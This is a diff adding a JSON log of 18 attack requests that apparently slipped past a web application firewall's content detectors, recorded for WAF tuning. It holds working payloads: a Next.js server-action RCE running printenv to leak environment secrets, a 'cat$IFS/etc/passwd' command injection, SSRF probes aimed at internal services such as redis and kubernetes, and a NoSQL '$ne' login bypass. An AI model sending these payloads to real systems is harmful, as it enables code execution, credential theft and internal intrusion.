@@ -1,0 +1,365 @@
+{
+  "note": "Attack nghiêm trọng WAF MISS (content-attack trong BODY/HEADER, không content-detector nào bắt). Đã sửa lỗi khớp nhầm path /bin/.",
+  "total": 18,
+  "by_type": {
+    "cmd_injection_body": 2,
+    "ssrf_body": 14,
+    "crlf_header": 1,
+    "nosql_body": 1
+  },
+  "records": [
+    {
+      "type": "cmd_injection_body",
+      "all_types": [
+        "cmd_injection_body",
+        "ssti_body"
+      ],
+      "method": "POST",
+      "url": "/",
+      "headers": {
+        "accept": "*/*",
+        "accept-encoding": "gzip, deflate, br",
+        "connection": "keep-alive",
+        "content-length": "569",
+        "content-type": "multipart/form-data; boundary=37a881b16846a7de1d7523f31ae5070c",
+        "host": "18.140.47.62",
+        "next-action": "x",
+        "user-agent": "python-requests/2.32.5"
+      },
+      "data": "--37a881b16846a7de1d7523f31ae5070c\r\nContent-Disposition: form-data; name=\"0\"\r\n\r\n{\"then\": \"$1:__proto__:then\", \"status\": \"resolved_model\", \"reason\": -1, \"value\": \"{\\\"then\\\": \\\"$B0\\\"}\", \"_response\": {\"_prefix\": \"var res=process.mainModule.require('child_process').execSync('printenv',{'timeout':30000}).toString().trim(); throw Object.assign(new Error('NEXT_REDIRECT'), {digest:`${res}`});\", \"_formData\": {\"get\": \"$1:constructor:constructor\"}}}\r\n--37a881b16846a7de1d7523f31ae5070c\r\nContent-Disposition: form-data; name=\"1\"\r\n\r\n\"$@0\"\r\n--37a881b16846a7de1d7523f31ae5070c--\r\n",
+      "waf_status": 404,
+      "round1_rule_id": "behavior_missing_referer,behavior_zero_depth,device_ip_rotation",
+      "id": 1
+    },
+    {
+      "type": "ssrf_body",
+      "all_types": [
+        "ssrf_body"
+      ],
+      "method": "PUT",
+      "url": "/api/profile",
+      "headers": {
+        "accept-encoding": "gzip",
+        "content-length": "43",
+        "content-type": "application/json",
+        "cookie": "waf_challenge_pass=1782580730403.6037756b34d2ceaaa114d21c44dced161a0bd9791ed726eebef7a884bb3369e6; sid=[redacted]",
+        "host": "127.0.0.1:8080",
+        "user-agent": "Go-http-client/1.1"
+      },
+      "data": "{\"email\":\"http://127.1\",\"display_name\":\"x\"}",
+      "waf_status": 401,
+      "round1_rule_id": "risk-score",
+      "id": 2
+    },
+    {
+      "type": "ssrf_body",
+      "all_types": [
+        "ssrf_body"
+      ],
+      "method": "PUT",
+      "url": "/api/profile",
+      "headers": {
+        "accept-encoding": "gzip",
+        "content-length": "45",
+        "content-type": "application/json",
+        "cookie": "waf_challenge_pass=1782580730403.6037756b34d2ceaaa114d21c44dced161a0bd9791ed726eebef7a884bb3369e6; sid=[redacted]",
+        "host": "127.0.0.1:8080",
+        "user-agent": "Go-http-client/1.1"
+      },
+      "data": "{\"email\":\"http://127.0.1\",\"display_name\":\"x\"}",
+      "waf_status": 401,
+      "round1_rule_id": "risk-score",
+      "id": 3
+    },
+    {
+      "type": "ssrf_body",
+      "all_types": [
+        "ssrf_body"
+      ],
+      "method": "PUT",
+      "url": "/api/profile",
+      "headers": {
+        "accept-encoding": "gzip",
+        "content-length": "59",
+        "content-type": "application/json",
+        "cookie": "waf_challenge_pass=1782580730403.6037756b34d2ceaaa114d21c44dced161a0bd9791ed726eebef7a884bb3369e6; sid=[redacted]",
+        "host": "127.0.0.1:8080",
+        "user-agent": "Go-http-client/1.1"
+      },
+      "data": "{\"email\":\"http://internal-service:8080\",\"display_name\":\"x\"}",
+      "waf_status": 401,
+      "round1_rule_id": "risk-score",
+      "id": 4
+    },
+    {
+      "type": "ssrf_body",
+      "all_types": [
+        "ssrf_body"
+      ],
+      "method": "PUT",
+      "url": "/api/profile",
+      "headers": {
+        "accept-encoding": "gzip",
+        "content-length": "51",
+        "content-type": "application/json",
+        "cookie": "waf_challenge_pass=1782580730403.6037756b34d2ceaaa114d21c44dced161a0bd9791ed726eebef7a884bb3369e6; sid=[redacted]",
+        "host": "127.0.0.1:8080",
+        "user-agent": "Go-http-client/1.1"
+      },
+      "data": "{\"email\":\"http://database:3306\",\"display_name\":\"x\"}",
+      "waf_status": 401,
+      "round1_rule_id": "risk-score",
+      "id": 5
+    },
+    {
+      "type": "ssrf_body",
+      "all_types": [
+        "ssrf_body"
+      ],
+      "method": "PUT",
+      "url": "/api/profile",
+      "headers": {
+        "accept-encoding": "gzip",
+        "content-length": "48",
+        "content-type": "application/json",
+        "cookie": "waf_challenge_pass=1782580730403.6037756b34d2ceaaa114d21c44dced161a0bd9791ed726eebef7a884bb3369e6; sid=[redacted]",
+        "host": "127.0.0.1:8080",
+        "user-agent": "Go-http-client/1.1"
+      },
+      "data": "{\"email\":\"http://redis:6379\",\"display_name\":\"x\"}",
+      "waf_status": 401,
+      "round1_rule_id": "risk-score",
+      "id": 6
+    },
+    {
+      "type": "ssrf_body",
+      "all_types": [
+        "ssrf_body"
+      ],
+      "method": "PUT",
+      "url": "/api/profile",
+      "headers": {
+        "accept-encoding": "gzip",
+        "content-length": "56",
+        "content-type": "application/json",
+        "cookie": "waf_challenge_pass=1782580730403.6037756b34d2ceaaa114d21c44dced161a0bd9791ed726eebef7a884bb3369e6; sid=[redacted]",
+        "host": "127.0.0.1:8080",
+        "user-agent": "Go-http-client/1.1"
+      },
+      "data": "{\"email\":\"http://elasticsearch:9200\",\"display_name\":\"x\"}",
+      "waf_status": 401,
+      "round1_rule_id": "risk-score",
+      "id": 7
+    },
+    {
+      "type": "ssrf_body",
+      "all_types": [
+        "ssrf_body"
+      ],
+      "method": "PUT",
+      "url": "/api/profile",
+      "headers": {
+        "accept-encoding": "gzip",
+        "content-length": "74",
+        "content-type": "application/json",
+        "cookie": "waf_challenge_pass=1782580730403.6037756b34d2ceaaa114d21c44dced161a0bd9791ed726eebef7a884bb3369e6; sid=[redacted]",
+        "host": "127.0.0.1:8080",
+        "user-agent": "Go-http-client/1.1"
+      },
+      "data": "{\"email\":\"http://kubernetes.default.svc.cluster.local\",\"display_name\":\"x\"}",
+      "waf_status": 401,
+      "round1_rule_id": "risk-score",
+      "id": 8
+    },
+    {
+      "type": "ssrf_body",
+      "all_types": [
+        "ssrf_body"
+      ],
+      "method": "POST",
+      "url": "/api/integrations/preview",
+      "headers": {
+        "accept-encoding": "gzip",
+        "content-length": "22",
+        "content-type": "application/json",
+        "host": "127.0.0.1:8080",
+        "user-agent": "Go-http-client/1.1"
+      },
+      "data": "{\"url\":\"http://127.1\"}",
+      "waf_status": 403,
+      "round1_rule_id": "risk-score",
+      "id": 9
+    },
+    {
+      "type": "ssrf_body",
+      "all_types": [
+        "ssrf_body"
+      ],
+      "method": "POST",
+      "url": "/api/integrations/preview",
+      "headers": {
+        "accept-encoding": "gzip",
+        "content-length": "24",
+        "content-type": "application/json",
+        "host": "127.0.0.1:8080",
+        "user-agent": "Go-http-client/1.1"
+      },
+      "data": "{\"url\":\"http://127.0.1\"}",
+      "waf_status": 403,
+      "round1_rule_id": "risk-score",
+      "id": 10
+    },
+    {
+      "type": "ssrf_body",
+      "all_types": [
+        "ssrf_body"
+      ],
+      "method": "POST",
+      "url": "/api/integrations/preview",
+      "headers": {
+        "accept-encoding": "gzip",
+        "content-length": "38",
+        "content-type": "application/json",
+        "host": "127.0.0.1:8080",
+        "user-agent": "Go-http-client/1.1"
+      },
+      "data": "{\"url\":\"http://internal-service:8080\"}",
+      "waf_status": 403,
+      "round1_rule_id": "risk-score",
+      "id": 11
+    },
+    {
+      "type": "ssrf_body",
+      "all_types": [
+        "ssrf_body"
+      ],
+      "method": "POST",
+      "url": "/api/integrations/preview",
+      "headers": {
+        "accept-encoding": "gzip",
+        "content-length": "30",
+        "content-type": "application/json",
+        "host": "127.0.0.1:8080",
+        "user-agent": "Go-http-client/1.1"
+      },
+      "data": "{\"url\":\"http://database:3306\"}",
+      "waf_status": 403,
+      "round1_rule_id": "risk-score",
+      "id": 12
+    },
+    {
+      "type": "ssrf_body",
+      "all_types": [
+        "ssrf_body"
+      ],
+      "method": "POST",
+      "url": "/api/integrations/preview",
+      "headers": {
+        "accept-encoding": "gzip",
+        "content-length": "27",
+        "content-type": "application/json",
+        "host": "127.0.0.1:8080",
+        "user-agent": "Go-http-client/1.1"
+      },
+      "data": "{\"url\":\"http://redis:6379\"}",
+      "waf_status": 403,
+      "round1_rule_id": "risk-score",
+      "id": 13
+    },
+    {
+      "type": "ssrf_body",
+      "all_types": [
+        "ssrf_body"
+      ],
+      "method": "POST",
+      "url": "/api/integrations/preview",
+      "headers": {
+        "accept-encoding": "gzip",
+        "content-length": "35",
+        "content-type": "application/json",
+        "host": "127.0.0.1:8080",
+        "user-agent": "Go-http-client/1.1"
+      },
+      "data": "{\"url\":\"http://elasticsearch:9200\"}",
+      "waf_status": 403,
+      "round1_rule_id": "risk-score",
+      "id": 14
+    },
+    {
+      "type": "ssrf_body",
+      "all_types": [
+        "ssrf_body"
+      ],
+      "method": "POST",
+      "url": "/api/integrations/preview",
+      "headers": {
+        "accept-encoding": "gzip",
+        "content-length": "53",
+        "content-type": "application/json",
+        "host": "127.0.0.1:8080",
+        "user-agent": "Go-http-client/1.1"
+      },
+      "data": "{\"url\":\"http://kubernetes.default.svc.cluster.local\"}",
+      "waf_status": 403,
+      "round1_rule_id": "risk-score",
+      "id": 15
+    },
+    {
+      "type": "crlf_header",
+      "all_types": [
+        "crlf_header"
+      ],
+      "method": "GET",
+      "url": "/game/list",
+      "headers": {
+        "connection": "close",
+        "host": "127.0.0.1",
+        "x-custom": "value",
+        "x-injected": "__V10_CRLF__"
+      },
+      "data": "",
+      "waf_status": 200,
+      "round1_rule_id": "risk-score",
+      "id": 16
+    },
+    {
+      "type": "nosql_body",
+      "all_types": [
+        "nosql_body"
+      ],
+      "method": "POST",
+      "url": "/login",
+      "headers": {
+        "accept-encoding": "gzip",
+        "content-length": "14",
+        "content-type": "text/plain",
+        "host": "127.0.0.1:8080",
+        "user-agent": "Go-http-client/1.1"
+      },
+      "data": "{\\\"$ne\\\":null}",
+      "waf_status": 400,
+      "round1_rule_id": "brute_force,behavior_missing_referer",
+      "id": 17
+    },
+    {
+      "type": "cmd_injection_body",
+      "all_types": [
+        "cmd_injection_body"
+      ],
+      "method": "POST",
+      "url": "/api/bet-reports/export",
+      "headers": {
+        "accept-encoding": "gzip",
+        "content-length": "31",
+        "content-type": "application/json",
+        "cookie": "waf_challenge_pass=1782580730403.6037756b34d2ceaaa114d21c44dced161a0bd9791ed726eebef7a884bb3369e6; sid=[redacted]",
+        "host": "127.0.0.1:8080",
+        "user-agent": "Go-http-client/1.1"
+      },
+      "data": "{\"format\":\"cat$IFS/etc/passwd\"}",
+      "waf_status": 401,
+      "round1_rule_id": "risk-score",
+      "id": 18
+    }
+  ]
+}
